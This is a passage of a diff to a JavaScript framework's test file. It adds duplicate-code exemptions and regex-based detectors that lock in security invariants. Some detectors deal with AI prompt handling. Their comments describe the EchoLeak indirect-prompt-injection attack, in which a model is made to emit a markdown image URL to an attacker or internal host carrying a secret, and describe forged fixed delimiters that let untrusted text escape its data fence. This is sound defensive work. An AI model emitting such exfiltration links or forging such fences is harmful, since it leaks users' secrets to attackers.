@@ -2555,6 +2555,23 @@ async function testNoDuplicateCodeBlocks() {
   // shape.
   var KNOWN_CLUSTERS = [
     {
+      mode:  "family-subset",
+      files: [
+        "lib/agent-idempotency.js:_checkArgs",
+        "lib/agent-tenant.js:_sealField",
+        "lib/archive-wrap.js:_tenantKeyWithRoot",
+        "lib/atomic-file.js:copyDirRecursive",
+        "lib/ddl-change-control.js:approve",
+        "lib/ddl-change-control.js:reject",
+        "lib/deprecate.js:alias",
+        "lib/guard-filename.js:verifyExtractionPath",
+        "lib/jose-jwe-experimental.js:decrypt",
+        "lib/mail-deploy.js:_validateTlsRptReport",
+        "lib/totp.js:uri",
+      ],
+      reason: "v0.14.12 — generic validate/derive/byte-walk control-flow shingle the vault-rotation reseal work tipped over the 3-file threshold. Members are unrelated primitives (agent-idempotency arg-check, agent-tenant per-tenant AEAD seal, archive-wrap explicit-root tenant-key derive, atomic-file recursive dir-copy, ddl-change-control dual-control approve/reject, deprecate alias, guard-filename path-segment safety walk, jose-jwe decrypt, mail-deploy TLS-RPT validate, totp otpauth URI build). No shared behaviour to extract; consolidating would couple ten unrelated subsystems.",
+    },
+    {
       files: ["lib/api-key.js:issue", "lib/db-query.js:<top>", "lib/session.js:create"],
       reason: "Generic JS array helper / lambda shape — Object.keys(...).map(fn) + similar functional idioms appearing in any code that walks a column-or-key list.",
     },
@@ -2725,6 +2742,33 @@ async function testNoDuplicateCodeBlocks() {
         "lib/vc.js:present",
       ],
       reason: "v0.12.42 — validateOpts-then-guard prelude shared by three builder-style functions: cert.create mints a certificate, mail-send-deliver.deliver sends a message, vc.present builds + signs a Verifiable Presentation. The common shingle is the `validateOpts(allowedKeys) + required-field / non-empty-array guards + typed-error throw` idiom; the bodies diverge entirely (X.509 minting / SMTP delivery / VC-JOSE-COSE presentation envelope). Same validate-then-guard family as the v0.12.29 / v0.12.33 / v0.12.40 clusters.",
+    },
+    {
+      mode:  "family-subset",
+      files: [
+        "lib/api-key.js:_validateIssueOpts",
+        "lib/http-client-cache.js:create",
+        "lib/network-dns.js:useDnsOverTls",
+      ],
+      reason: "v0.14.15 — validateOpts config-validation prelude (validateOpts(allowedKeys) + requireNonEmptyString + the new optionalPort port-range guard + typed-error throw). api-key._validateIssueOpts validates an API-key issue spec; http-client-cache.create validates a cache config; network-dns.useDnsOverTls validates a DoT endpoint. Wiring validateOpts.optionalPort into the DoT site tipped its preamble past the 50-token shingle threshold against two unrelated config-time primitives. Bodies diverge entirely; the shared primitive IS validateOpts (already extracted) — coupling these specs would couple three unrelated standards on a syntactic accident. Verified coincidental (absent on clean main; the 3 functions are unrelated). Same validate-then-guard family as the v0.12.29 / v0.12.42 clusters.",
+    },
+    {
+      mode:  "family-subset",
+      files: [
+        "lib/agent-idempotency.js:_safeAudit",
+        "lib/agent-orchestrator.js:_safeAudit",
+        "lib/redis-client.js:_frameToValue",
+      ],
+      reason: "v0.14.15 — coincidental boilerplate shingle surfaced when the validateOpts.optionalPort wiring was added to redis-client.create: the file's token stream shifted enough that a 50-token window in redis-client.js clusters with the identical _safeAudit audit-emit wrappers in agent-idempotency / agent-orchestrator (a try/catch around audit().safeEmit). _safeAudit drop-silently emits an audit event; redis-client._frameToValue parses a RESP wire frame — entirely unrelated behaviour sharing only a generic guard/try-catch idiom. Verified absent on clean main; no shared logic to extract.",
+    },
+    {
+      mode:  "family-subset",
+      files: [
+        "lib/compliance-sanctions-fetcher.js:create",
+        "lib/network-nts.js:performKeHandshake",
+        "lib/web-push-vapid.js:buildVapidAuthHeader",
+      ],
+      reason: "v0.14.15 — validateOpts config-validation prelude again: network-nts.performKeHandshake gained the optionalPort port-range guard, tipping its preamble past the shingle threshold against compliance-sanctions-fetcher.create (sanctions-list fetch config) and web-push-vapid.buildVapidAuthHeader (VAPID JWT auth header build). Three unrelated specs (NTS-KE handshake / sanctions fetch / Web-Push VAPID) sharing only the validateOpts-then-guard idiom; the shared primitive is validateOpts. Verified coincidental (absent on clean main). Same family as the v0.12.29 / v0.12.42 clusters.",
     },
     {
       mode:  "family-subset",
@@ -6300,6 +6344,241 @@ var KNOWN_ANTIPATTERNS = [
     skipCommentLines: true,
     allowlist: [],
     reason: "Codex P1A on v0.12.12 PR #163 — ai-disclosure.chatbot's on-request placement returned shouldEmit=true unconditionally, breaking the three-mode placement contract. Detector locks the static shape so a future placement primitive in ai-disclosure.js can't regress.",
+  },
+
+  {
+    // b.ai.output.sanitize neutralizes the EchoLeak markdown-image /
+    // link zero-click exfiltration class (CVE-2025-32711) by gating
+    // every extracted URL through b.safeUrl.parse (scheme + credential)
+    // AND b.ssrfGuard.classify (internal / loopback / link-local /
+    // cloud-metadata IP-range). The bug class this locks: a future edit
+    // that extracts a URL from model output in lib/ai-output.js (a
+    // markdown image / link / reference URL or an HTML src / href) but
+    // drops the SSRF gate would re-open auto-fetch to an internal /
+    // metadata host. The file-scoped invariant: ai-output.js MUST
+    // continue to compose ssrfGuard.classify. (safe-url alone is NOT
+    // sufficient — it does protocol-allowlist + userinfo + IDN, but
+    // does NOT classify 169.254.169.254 / RFC1918 / loopback.) If
+    // ai-output.js ever stops gating URLs (e.g. the primitive is
+    // removed), carry an `allow:ai-output-url-ssrf-gate` marker with the
+    // reason.
+    id: "ai-output-markdown-url-without-ssrf-gate",
+    primitive: "lib/ai-output.js sanitize() MUST gate every URL extracted from model output (markdown image / link / reference + HTML src/href) through BOTH b.safeUrl.parse (scheme + credential refusal) AND b.ssrfGuard.classify (internal / loopback / link-local / cloud-metadata IP-range refusal) — the EchoLeak zero-click exfiltration class (CVE-2025-32711). safe-url alone does not classify private / metadata IPs; ssrfGuard is the IP-range layer. Dropping the ssrfGuard composition re-opens auto-fetch to an attacker / metadata host.",
+    // File-scoped via a content shape unique to ai-output.js: its
+    // markdown-image URL extractor variable (MD_IMAGE_RE). When that
+    // extractor is present, the file MUST also reference
+    // ssrfGuard.classify so the IP-range gate can't be silently
+    // dropped. Other lib files that carry a `![` literal (e.g.
+    // ai-input.js's markdown-injection pattern) don't define
+    // MD_IMAGE_RE, so the detector is precise to the output gate.
+    regex:    /\bMD_IMAGE_RE\b/,
+    requires: /ssrfGuard\.classify|allow:ai-output-url-ssrf-gate/,
+    skipCommentLines: true,
+    allowlist: [],
+    reason: "b.ai.output.sanitize (v0.14.11) defends OWASP LLM05:2025 improper output handling. The EchoLeak markdown-image exfiltration class (CVE-2025-32711, Microsoft 365 Copilot, CVSS 9.3) coerces the model via indirect prompt injection to emit ![](https://attacker-or-internal-host/<secret>); the client auto-fetches it zero-click. The defense gates every output URL through safeUrl.parse + ssrfGuard.classify so internal / cloud-metadata targets are neutralized. Detector locks the composition: a future edit to ai-output.js that handles markdown-image URLs without ssrfGuard.classify trips the gate so the SSRF layer can't be silently dropped.",
+  },
+
+
+  {
+    // b.ai.input.classifyWithSources (v0.14.11) applies a TIER-RELATIVE
+    // injection threshold to retrieval-augmented (RAG) sources: untrusted
+    // / internal sources escalate on a single severity-2 or any
+    // severity-3 signal, where the direct prompt keeps classify()'s
+    // 2-severity-2 threshold. The bug class this locks: a handler in lib/
+    // that maps b.ai.input.classify over a sources array on its own loses
+    // that tier-relative threshold (and the worst-of aggregate +
+    // tainted-source bookkeeping), re-opening the indirect prompt-
+    // injection gap (OWASP LLM01:2025) that retrieved data must be
+    // classified MORE strictly than operator input. The fix is to compose
+    // classifyWithSources, which owns the per-tier escalation. A file that
+    // legitimately maps classify over elements is classifyWithSources's
+    // own module (it names the symbol) — cleared by the `requires`
+    // companion. The lookbehind excludes a `function classify(` decl that
+    // happens to follow an unrelated .map() in the same file.
+    id: "rag-source-classify-without-classifywithsources",
+    primitive: "to classify retrieval-augmented (RAG) sources alongside a prompt, compose b.ai.input.classifyWithSources — do NOT map b.ai.input.classify over a sources array by hand. classifyWithSources applies a tier-relative threshold (untrusted / internal sources escalate on a single severity-2 / any severity-3, vs classify's 2-severity-2 baseline) and computes the worst-of aggregate + tainted-source set. Mapping classify directly loses the stricter retrieved-data threshold (OWASP LLM01:2025 indirect prompt injection; CVE-2025-32711 EchoLeak).",
+    regex: /\.map\(\s*(?:function\s*\([^)]*\)\s*\{|\([^)]*\)\s*=>|[A-Za-z_$][\w$]*\s*=>)[\s\S]{0,60}?(?<!function\s)\bclassify\s*\(/,
+    requires: /classifyWithSources|allow:rag-source-classify-without-classifywithsources/,
+    skipCommentLines: true,
+    allowlist: [],
+    reason: "b.ai.input.classifyWithSources (v0.14.11) defends OWASP LLM01:2025 indirect prompt injection — retrieved RAG context is an attacker-influenceable channel (CVE-2025-32711 EchoLeak, CVSS 9.3; NIST AI 600-1 information-integrity). Mapping b.ai.input.classify over sources by hand applies the operator-prompt threshold to retrieved data, which is too permissive: a single severity-2 fragment in an untrusted document should escalate. Detector locks the composition so a future handler that re-rolls the per-source loop without classifyWithSources trips the gate. No pre-existing lib site maps classify over an array; allowlist is empty.",
+  },
+
+  {
+    // b.ai.prompt.template (v0.14.11) fences untrusted context / user
+    // segments with a PER-RENDER crypto-nonce delimiter
+    // (<<UNTRUSTED:role:NONCE>> ... <<END:role:NONCE>>) and strips any
+    // forged occurrence of the active nonce before wrapping, so untrusted
+    // content cannot close the boundary and break into the control plane
+    // (spotlighting / datamarking, Microsoft 2024; NIST AI 100-2e2025;
+    // OWASP LLM01:2025 indirect prompt injection). The bug class this
+    // locks: a prompt-assembly site in lib/ that wraps untrusted content
+    // in a FIXED / guessable literal fence (<user_input> ... </user_input>,
+    // </context>, [DATA]) the attacker can simply emit to terminate. The
+    // regex fires on a fence LITERAL used as a wrapper — concatenated with
+    // a variable ("<user_input>" + x  /  x + "</user_input>") or carrying a
+    // template interpolation (`<user_input>${...}`). It deliberately does
+    // NOT match a bare `###` heading (markdown), and clears any file that
+    // mints a `nonce` / calls generateBytes (the correct shape).
+    // ai-prompt.js's own ROLE_CONTROL_TOKENS literals are an escape-target
+    // allowlist, never concatenated as fences, so they don't trip this.
+    id: "ai-prompt-template-fixed-delimiter",
+    primitive: "prompt-assembly that wraps untrusted (context / user) content MUST fence it with a per-render high-entropy delimiter (compose b.ai.prompt.template / b.crypto.generateBytes), NOT a fixed / guessable literal fence (<user_input>, </context>, [DATA]). A static fence is forgeable: the model output emits the close-tag verbatim and breaks into the control plane (OWASP LLM01:2025 indirect prompt injection; spotlighting/datamarking, Microsoft 2024).",
+    regex: /(?:`[^`]*(?:<\/?(?:user_input|context|user|data|untrusted)>|\[\/?(?:DATA|USER|CONTEXT|UNTRUSTED)\])[^`]*\$\{|["'](?:<\/?(?:user_input|context|user|data|untrusted)>|\[\/?(?:DATA|USER|CONTEXT|UNTRUSTED)\])["']\s*\+|\+\s*["'](?:<\/?(?:user_input|context|user|data|untrusted)>|\[\/?(?:DATA|USER|CONTEXT|UNTRUSTED)\])["'])/i,
+    requires: /\bnonce\b|generateBytes|allow:ai-prompt-template-fixed-delimiter/,
+    skipCommentLines: true,
+    allowlist: [],
+    reason: "b.ai.prompt.template (v0.14.11) defends OWASP LLM01:2025 indirect prompt injection by fencing untrusted segments with a per-render crypto nonce the content can't forge (spotlighting/datamarking, Microsoft 2024; NIST AI 100-2e2025). A fixed literal fence (<user_input>...</user_input>, [DATA]...[/DATA]) is forgeable — the model emits the close-tag and escapes the data plane. Detector locks the discipline: any lib prompt-assembly that wraps content in a static fence (literal + variable, or template interpolation) without a per-render nonce trips the gate. ai-prompt.js mints a nonce + calls generateBytes (cleared by requires) and its ROLE_CONTROL_TOKENS literals are an escape-target list, not a wrapper. No pre-existing lib site uses a fixed prompt fence; allowlist is empty.",
+  },
+
+  {
+    // CVE-2025-52556 / CWE-347 (improper signature verification) re-open
+    // guard for the C2PA sigTst2 timestamp countersignature. The ONLY
+    // correct timestamp-verification path is b.tsa.verifyToken, which does
+    // the full RFC 3161 §2.4.2/§2.3 check: the CMS signature over the
+    // signed attributes + the messageDigest recompute + a critical, sole
+    // id-kp-timeStamping EKU — NOT a chain-only shortcut. A bespoke cert-
+    // chain walk (checkIssued / X509Certificate(...).verify) on the
+    // timestamp token in place of tsa.verifyToken accepts a backdated /
+    // forged token whose CMS signature was never checked. Scoped to the
+    // timestamp context (sigTst2 / tstToken / tstContainer /
+    // CounterSignature) so the CAWG identity-assertion x509 chain check
+    // (_verifyIdentityX509Chain), which legitimately walks its own chain,
+    // is not flagged.
+    id: "c2pa-timestamp-bespoke-chain-check",
+    primitive: "verify a C2PA sigTst2 timestamp countersignature through b.tsa.verifyToken (full RFC 3161 CMS-signature + messageDigest + critical-sole-EKU check) — never a bespoke cert-chain-only walk on the timestamp token",
+    regex: /(?:sigTst2|tstToken|tstContainer|CounterSignature)[\s\S]{0,400}?(?:\.checkIssued\s*\(|new\s+(?:nodeCrypto\.)?X509Certificate[\s\S]{0,120}?\.verify\s*\()/,
+    skipCommentLines: true,
+    allowlist: [],
+    reason: "CVE-2025-52556 (RFC 3161 timestamp-validation bypass) / CWE-347 (improper signature verification). The C2PA sigTst2 (RFC 9921) timestamp countersignature in lib/content-credentials.js MUST be verified through b.tsa.verifyToken, which performs the full RFC 3161 §2.4.2/§2.3 check (CMS signature over the signed attributes, messageDigest recompute, critical + sole id-kp-timeStamping EKU). A bespoke cert-chain-only check (checkIssued / X509Certificate(...).verify) on the timestamp token accepts a token whose CMS signature was never verified — a backdating / key-compromise forgery. The detector fires when a chain-walk appears near a timestamp token; route through tsa.verifyToken instead. Scoped to the timestamp context so the CAWG identity x509 chain (_verifyIdentityX509Chain) is not affected.",
+  },
+
+  {
+    // v0.14.11 — the GPAI Code-of-Practice adherence declaration
+    // (b.compliance.aiAct.gpai.declareAdherence) MUST ship inside a
+    // signed CycloneDX 1.6 ML-BOM envelope via b.ai.modelManifest
+    // .build/sign (ML-DSA-87 over canonical-JSON-1785), which carries
+    // the signature-substitution defense in verify. A bare-JSON
+    // adherence emitter that writes the `ai-act:gpai-cop-adherence`
+    // property bag into a transport WITHOUT routing through
+    // modelManifest().sign is a tamper-evidence regression: the
+    // obligation set + per-commitment evidence hashes could be edited
+    // after the fact (CWE-345 / CWE-347). Any lib/ file that emits the
+    // adherence property MUST compose the signed envelope OR carry an
+    // `allow:gpai-adherence-declaration-must-be-signed` marker with the
+    // reason signing is bypassed.
+    id: "gpai-adherence-declaration-must-be-signed",
+    primitive: "any lib/ code that emits the `ai-act:gpai-cop-adherence` property bag MUST route through b.ai.modelManifest.sign (the signed CycloneDX 1.6 ML-BOM envelope) so the GPAI Code-of-Practice declaration is tamper-evident — never serialize a bare adherence JSON to a transport. Bypass requires an explicit `allow:gpai-adherence-declaration-must-be-signed` marker.",
+    regex: /["']ai-act:gpai-cop-adherence["']/,
+    requires: /modelManifest\(\)\.sign|allow:gpai-adherence-declaration-must-be-signed/,
+    skipCommentLines: true,
+    allowlist: [],
+    reason: "v0.14.11 — b.compliance.aiAct.gpai.declareAdherence binds the EU AI Act Art. 53/55 GPAI Code-of-Practice adherence declaration (derived obligation set + per-commitment SHA3-512 evidence hashes) into an ML-DSA-87-signed CycloneDX 1.6 ML-BOM via b.ai.modelManifest.build/sign. The signed envelope is the ONLY emission path on the happy path; verify re-canonicalizes and never trusts embedded signed-bytes (CVE-2025-29774 / CVE-2025-29775 xml-crypto signature-substitution class). This detector locks the contract so a future emitter can't ship a bare unsigned adherence JSON whose obligation set could be silently downgraded after signing."
+  },
+
+  {
+    // A framework module that registers a cryptoField {aad:true} table on an
+    // OPERATOR-SUPPLIED store via the lazy-require form cryptoField().registerTable
+    // (agent-idempotency / agent-orchestrator / agent-tenant) seals AAD cells
+    // OUTSIDE db.enc. The in-tree b.vaultRotate.rotate pipeline only walks tables
+    // inside db.enc, so it CANNOT reach these stores — after a vault-key rotation
+    // every such cell is orphaned under the retired root (CWE-320). Every such
+    // module MUST export an AAD_ROTATION descriptor whose reseal hook rotates the
+    // operator store out-of-band. The detector locks the contract so a new
+    // external-store {aad:true} table can't silently re-introduce the orphan.
+    // The db.init-reachable tables use the direct cryptoField.registerTable form
+    // (no parens) and are rotated by the in-tree pipeline, so they don't match.
+    id: "aad-external-store-table-without-rotation",
+    primitive: "every lib/ module that calls cryptoField().registerTable(...) (the lazy-require form, used only for {aad:true} tables sealed on an operator-supplied store outside db.enc) MUST export an AAD_ROTATION descriptor { table, rowIdField, schemaVersion, backend: \"external\", reseal } whose reseal({ store, oldRootJson, newRootJson }) re-seals every persisted AAD cell old-root -> new-root via vaultAad.resealRoot, rebuilding AAD via cryptoField._aadParts. Without it, a vault-key rotation orphans the store's ciphertext under the retired root.",
+    regex: /cryptoField\(\)\.registerTable/,
+    requires: /AAD_ROTATION|allow:aad-external-store-table-without-rotation/,
+    skipCommentLines: true,
+    allowlist: [],
+    reason: "External-store {aad:true} tables (agent-idempotency 'agent_idempotency', agent-orchestrator 'agent_orchestrator_registry', agent-tenant 'agent_tenant_registry') seal AAD cells on an operator-supplied backend the in-tree b.vaultRotate.rotate pipeline can't reach. Each now exports AAD_ROTATION.reseal so an operator rotates them out-of-band, composing vaultAad.resealRoot + cryptoField._aadParts (one source of truth for the AAD tuple). The detector ensures a future external-store {aad:true} table can't ship without a rotation hook, which would silently orphan its ciphertext under the old vault root after a rotation (CWE-320 cryptographic-key-management failure).",
+  },
+
+  {
+  // A module that declares a root-derived sealed-cell PREFIX FAMILY
+  // (a `<name>-vN:` ciphertext prefix whose per-cell key is derived
+  // from the vault master root — SHA3-512 of b.vault.getKeysJson())
+  // MUST also ship an AAD_ROTATION reseal descriptor so a vault-key
+  // rotation can re-seal every prior cell old-root -> new-root. Without
+  // the reseal path a keypair rotation orphans every cell (decryptable
+  // under neither root). The bug class this locks: a future module adds
+  // a `var X_PREFIX = \"foo-v1:\";` sealed-cell family + an explicit-root
+  // derivation but forgets the reseal hook, silently re-breaking the
+  // \"rotation = re-seal\" promise. agent-tenant.js (tnt-v1:) and
+  // agent-snapshot.js (snap-sealed-v1:) both define the prefix AND export
+  // AAD_ROTATION, so they are cleared by the `requires` companion. vault-
+  // aad.js / vault/rotate.js are the reseal SUBSTRATE, not a prefix
+  // family, so they don't carry the literal and don't trip.
+  id: "root-prefix-family-without-reseal",
+  primitive: "a module that declares a root-derived sealed-cell prefix family (var <NAME>_PREFIX = \"<token>-vN:\" whose per-cell key derives from the vault root via SHA3-512 of b.vault.getKeysJson) MUST also export an AAD_ROTATION descriptor with a reseal({ store, oldRootJson, newRootJson }) hook (composing vaultAad.resealRoot for vault.aad: cells and the explicit-root derived key on both sides for the prefix-family cells). Otherwise a vault-key rotation orphans every prior cell — decryptable under neither root — silently breaking the rotation = re-seal contract.",
+  regex: /\bvar\s+[A-Z][A-Z0-9_]*_PREFIX\s*=\s*"[a-z0-9-]+-v\d+:"/,
+  requires: /AAD_ROTATION|allow:root-prefix-family-without-reseal/,
+  skipCommentLines: true,
+  allowlist: [],
+  reason: "v0.14.x — the two root-derived prefix families (b.agent.tenant tnt-v1: + b.agent.snapshot snap-sealed-v1:) derive their per-cell XChaCha20-Poly1305 key from SHA3-512(b.vault.getKeysJson()); rotating the vault keypair changes the root, so every prior cell must be re-sealed old-root -> new-root via the module's AAD_ROTATION reseal hook (the migration is NOT automatic on read). Detector locks the discipline: any new lib module that declares a `<name>-vN:` sealed-cell prefix family without an AAD_ROTATION reseal path trips the gate. Both current matches export AAD_ROTATION (cleared by requires); allowlist is empty — a future prefix family with no reseal path is a real defect, not allowlist material.",
+},
+
+  {
+    id: "wrapped-aad-seal-needs-reseal-path",
+    primitive: "a lib module that AAD-seals a value (vault.aad: ciphertext) and wraps it behind its own string-prefix constant before persisting MUST export an AAD_ROTATION descriptor whose reseal() strips the wrapper, resealRoots the inner blob old->new root under the rebuilt AAD, and re-applies the wrapper - a `db.enc` scan for the bare \"vault.aad:\" prefix can't detect or re-key a wrapper-prefixed cell, so vault-key rotation would silently strand it. See lib/agent-snapshot.js (SEALED_PREFIX + AAD_ROTATION). Bypass requires an `allow:wrapped-aad-seal-needs-reseal-path` marker naming why the wrapped values are out of rotation scope.",
+    regex: /=\s*"[^"]*sealed[^"]*:"\s*;/i,
+    requires: /AAD_ROTATION|allow:wrapped-aad-seal-needs-reseal-path/,
+    skipCommentLines: true,
+    allowlist: [
+      // cache.js wraps a PLAIN vault().seal ("vault:" envelope), not an
+      // AAD-root-bound "vault.aad:" blob - re-keyed by the whole-vault
+      // rotation, not the AAD reseal pipeline. Not in AAD_ROTATION scope.
+      "lib/cache.js",
+    ],
+    reason: "v0.14.12 b.agent.snapshot.reseal - the snapshot envelope is AAD-sealed then wrapped behind SEALED_PREFIX (\"snap-sealed-v1:\") and written to an operator backend, so a db.enc scan for the bare \"vault.aad:\" prefix can neither detect nor re-key it during a vault-key rotation. The module exports AAD_ROTATION { table, rowIdField, schemaVersion, backend:\"external\", reseal } so the rotation pipeline drives the re-key (resealRoot old->new root under the rebuilt _snapshotAad, prefix re-applied). Detector locks the invariant: any future module that wraps an AAD-sealed value behind its own prefix constant must ship the same reseal path so wrapper-hidden ciphertext can't escape vault-key rotation.",
+  },
+
+  { id: "archive-tenant-rewrap-must-compose-rewrapTenant", primitive: "b.archive.rewrapTenant", scanScope: "lib", regex: /archive-wrap\|tenant\||derivedKey(?:WithRoot)?\([^)]*["']archive-wrap["']/, allowlist: ["lib/archive-wrap.js", "lib/agent-tenant.js"], reason: "v0.14.12 — recipient: \"tenant\" archive blobs are keyed off the vault root (b.agent.tenant.derivedKey(tenantId, \"archive-wrap\")) and sealed under the tenant-bound AAD literal \"archive-wrap|tenant|<id>\". The vault rotation pipeline (b.vaultRotate.rotate) does NOT walk operator-placed blobs (files / object-storage / backups), so re-wrapping them old-root->new-root MUST compose b.archive.rewrapTenant — never re-derive the archive-wrap tenant key or rebuild the tenant AAD inline, which would (a) skip the explicit-root straddle the live singleton can't do and (b) risk drifting the AAD/derivation away from the single source. Data-loss class: CWE-325 (missing required cryptographic step) / CWE-665 (improper initialization of the new-root key). Owner lib/archive-wrap.js holds both the AAD construction and the explicit-root derivation; lib/agent-tenant.js is the home of the derivedKey derivation + carries the canonical \"archive-wrap\" purpose only in its @primitive docstring examples (stripped by the comment-skip preprocessor). Any OTHER lib file matching this shape is re-implementing tenant-blob crypto and must route through b.archive.rewrapTenant instead." },
+
+  { id: "no-phantom-not-yet-supported-throw", primitive: "a primitive must not advertise a capability in @module/@intro/@card prose and then throw an unimplemented stub with no re-open condition — implement it or remove the advertisement (overdue-broken-promise class)", scanScope: "lib", skipCommentLines: true, regex: /not yet supported|operator demand TBD|not[ -]supported in v1\b/i, allowlist: [], reason: "v0.14.13 — mail-srs (the phantom srs1Rewrite fn) and oid4vp (DCQL null path-segment) each advertised a capability in their @module/@intro/@card and then threw a bare stub ('not yet supported', 'operator demand TBD', 'not supported in v1') with no written re-open condition. A defer is only complete WITH a condition (feedback_defer_is_a_v1_decision); legitimate defers read 're-opens when X' / 'defer-with-condition', never a bare 'not yet supported'. Both stubs are now implemented (SRS1 double-forward + DCQL array-wildcard); this detector (throw/code strings only — comments skipped) keeps the bare-defer phrasing from re-entering lib/." },
+
+  { id: "dcql-null-path-must-recurse-not-refuse", primitive: "DCQL claims-path-pointer null segment selects all elements of the array at that depth (OpenID4VP 1.0 §7.1.1) — recurse over array elements, never throw 'not supported'", scanScope: "lib", regex: /null[- ]?path[- ]?segment[- ]?not[- ]?supported|null path segment \(any-element\) not supported/i, allowlist: [], reason: "v0.14.13 — lib/auth/oid4vp.js _resolvePath once refused null path segments with AuthError(\"auth-oid4vp/null-path-segment-not-supported\") while the module @card advertised DCQL. A null segment is the spec-mandated array wildcard (OpenID4VP 1.0 §7.1.1: select all elements of the currently selected array); refusing it under-discloses a legitimate presentation (CWE-863 incorrect authorization). _walkPath now recurses over array elements with existence semantics (null on a non-array node is a clean non-match, not a throw — holder credential data, rule §5 defensive-reader tier). Detector ensures the throw-stub phrasing cannot return; the testNoStaleDefers version-promise detector does not catch it because its regex requires a NN.NN version and the stub said single-digit \"in v1\"." },
+
+  { id: "safe-archive-extract-to-memory-no-disk-write", primitive: "b.safeArchive.extractToMemory must stay disk-free — it composes the readers' extractEntries() async generators and yields { name, bytes, size } in memory; the disk path is b.safeArchive.extract", scanScope: "lib", regex: /async function\* extractToMemory[\s\S]{0,2000}?\b(writeFileSync|renameSync|mkdirSync|appendFileSync|createWriteStream)\b/, allowlist: [], reason: "v0.14.13 — extractToMemory is the read-only / serverless-FS counterpart to extract(): it MUST NOT touch disk, it yields decompressed entry bytes from the readers' extractEntries() async generators. A writeFileSync / renameSync / mkdirSync / createWriteStream inside the generator body means the no-disk-write contract regressed (the exact failure the serverless / read-only-FS use case forbids). The disk extract() is the only writer; the inverse must-compose-the-orchestrator direction is already covered by archive-substrate-bypass / safe-archive-extract-bypass. Empty allowlist — a disk write on this path is a real defect, not allowlist material." },
+
+  { id: "safe-archive-no-phantom-encryptpacked-envelope", primitive: "b.safeArchive must not sniff or advertise a b.crypto.encryptPacked / EPACK archive envelope — encryptPacked writes a 1-byte XChaCha20 format header, not a magic prefix, and no framework primitive produces an EPACK-wrapped archive; only the real BAWRP / BAWPP wrap envelopes are sniffed + auto-unwrapped", scanScope: "lib", regex: /\bEPACK\b|encryptPacked-wrapped (archives|envelopes) (are )?auto-unwrapped|format:\s*"encryptPacked"/, allowlist: [], reason: "v0.14.13 — safe-archive's _sniffMagic carried a phantom MAGIC_ENCPACKED=\"EPACK\" branch returning { format: \"encryptPacked\" } and the @intro + format-unsupported messages advertised encryptPacked-wrapped archives as auto-unwrapped, but b.crypto.encryptPacked writes a 1-byte format header (0x02 XChaCha20-Poly1305), NOT an \"EPACK\" magic — so nothing ever produced or matched it, and b.archive.sniffEnvelope (the sibling sniffer) only knows BAWRP / BAWPP. Codex P2 on PR #294 surfaced the sniff vs unwrap vs advertisement drift; the phantom format + advertisement were removed. This detector keeps the dead EPACK magic and the false auto-unwrap advertisement from creeping back into lib/." },
+
+  { id: "consent-grant-recognized-purpose-unenforced", primitive: "minting a consent row with a recognized gated purpose (educational-only) must go through b.consent — the PURPOSES vocabulary + grant() lawful-basis gate — not a hardcoded purpose literal that records the value without enforcing its FERPA/SOPIPA lawful-basis constraint", scanScope: "lib", regex: /purpose:\s*["']educational-only["']/, requires: /recognizedPurpose|PURPOSES/, allowlist: ["lib/consent.js"], reason: "v0.14.14 — F5.1 educational-only is a GATED consent purpose: b.consent.grant() refuses a legitimate_interests lawful basis for it (FERPA 34 CFR 99.31 school-official exception / California SOPIPA Cal. B&P 22584). A lib file that mints a consent row with a hardcoded purpose:\"educational-only\" literal WITHOUT composing the PURPOSES vocabulary re-introduces the broken-promise shape where the value is recorded but its lawful-basis constraint is never enforced (CWE-285 improper authorization). consent.js owns + enforces PURPOSES and is allowlisted; any other lib file matching the literal must route through b.consent. Must-compose detector for the gated-purpose primitive per feedback_new_safe_primitive_ships_with_must_compose_detector." },
+
+  { id: "consent-purposes-null-proto", primitive: "the recognized-purpose map (PURPOSES) must be a null-prototype object so an operator-supplied free-form purpose colliding with an Object.prototype member (toString / constructor / __proto__) resolves to undefined, not the prototype value", scanScope: "lib", regex: /var PURPOSES\s*=\s*Object\.freeze\(/, requires: /Object\.create\(null\)/, allowlist: [], reason: "v0.14.14 Codex P2 on PR #295 (CWE-1321) — recognizedPurpose(name) + grant() index PURPOSES[purpose] with an operator-controlled value; a plain-prototype map returns Object.prototype.toString (truthy) for purpose \"toString\", breaking the null-for-free-form contract and entering grant()'s recognized branch for a value listPurposes() never exposes. PURPOSES is now Object.freeze(Object.assign(Object.create(null), {...})) so every unrecognized key resolves to undefined. Detector requires the null-prototype declaration so the lookup can't silently revert to a plain object." },
+
+  { id: "connect-entry-point-port-must-compose-optionalPort", primitive: "a connection entry point reading opts.port / opts.kePort / opts.ntpPort with a `|| <default>` fallback must first validate it via validateOpts.optionalPort (or, where a permanent typed error is needed, the equivalent numericBounds.isPositiveFiniteInt(opts.port) + 65535 cap) — an unvalidated opts.port || N silently accepts a string / negative / NaN / out-of-range port", scanScope: "lib", regex: /\bopts\.(?:port|kePort|ntpPort)\s*\|\|/, requires: /validateOpts\.optionalPort\(|isPositiveFiniteInt\(opts\.port\)/, allowlist: [], reason: "v0.14.15 — the connection entry points (mail.smtpTransport, ntpCheck.querySingle, dns.useDnsOverTls, nts.performKeHandshake / querySingle / query, redis.create) read opts.port || <default>, silently coercing a string / negative / NaN / >65535 port; rule §5 says config-time entry points THROW so the operator catches the typo at boot. Each now composes validateOpts.optionalPort (RFC 6335 §6 [1,65535]; allowZero for the app.listen ephemeral bind) — or, where a MailError-permanent typed error is needed, the same numericBounds.isPositiveFiniteInt + 65535 rule inline. The requires-companion clears a file once it validates; a new entry point reading opts.port || N without composing the validator trips the gate." },
+
+  {
+    // ROTATION-EPOCH ACCEPT (v0.14.x): a vault-key rotation (b.vault.rotate)
+    // re-keys the local dataDir, which changes the SHA3-512 fingerprint of
+    // the vault PUBLIC keys on every node. The canonical fingerprint in
+    // _blamejs_cluster_state.vaultKeyFp then goes stale and
+    // cluster.js _checkVaultKeyConsistency would VAULT_KEY_DRIFT-refuse boot
+    // on every node. The fix gates the FATAL refusal on the operator's
+    // acceptVaultKeyRotation declaration (configuredAcceptRotation): when
+    // set, the node ADOPTS the new fingerprint + bumps a rotationEpoch
+    // instead of refusing; when unset, the strict cross-node drift refusal
+    // is unchanged (fail-closed against silent sealed-column corruption,
+    // CWE-345). The bug class this locks: a future edit that re-hardens the
+    // mismatch path to throw VAULT_KEY_DRIFT unconditionally (removing the
+    // rotation escape hatch) would re-introduce the every-node-refuses-boot
+    // outage after a legitimate rotation. VAULT_KEY_DRIFT is unique to
+    // lib/cluster.js, so this is effectively file-scoped: the throw must
+    // coexist with the configuredAcceptRotation gate. If the gate is ever
